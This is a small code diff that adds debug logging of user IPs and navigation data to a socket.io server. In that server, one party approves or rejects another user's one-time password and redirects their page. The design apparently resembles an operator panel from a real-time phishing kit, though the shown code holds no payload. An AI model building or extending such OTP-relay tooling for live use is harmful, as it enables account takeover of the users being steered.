@@ -371,8 +371,12 @@ io.on('connection', (socket, req) => {
         if (sessionStore.has(userIP)) {
             let userDetails = sessionStore.get(userIP);
             if(data.res == 'good'){
+                console.log(data.ip)
+                console.log(userDetails.getUserDataNavig.next)
                 io.to(data.ip).emit('OTPResponse', {res:true, next: userDetails.getUserDataNavig.next})
            } else {
+                console.log(data.ip)
+                console.log(userDetails.getUserDataNavig.navig)
                 io.to(data.ip).emit('OTPResponse', {res:false, next: userDetails.getUserDataType.navig})
            }
         }
@@ -387,6 +391,7 @@ io.on('connection', (socket, req) => {
 
             console.log('nextNavig')
             console.log(data)
+            console.log(userIP)
 
             userDetails.getUserDataNavig = data
             sessionStore.set(userIP, userDetails);
@@ -402,6 +407,7 @@ io.on('connection', (socket, req) => {
 
             console.log('typeOTP')
             console.log(data)
+            console.log(userIP)
 
             userDetails.getUserDataType = data
             sessionStore.set(userIP, userDetails);
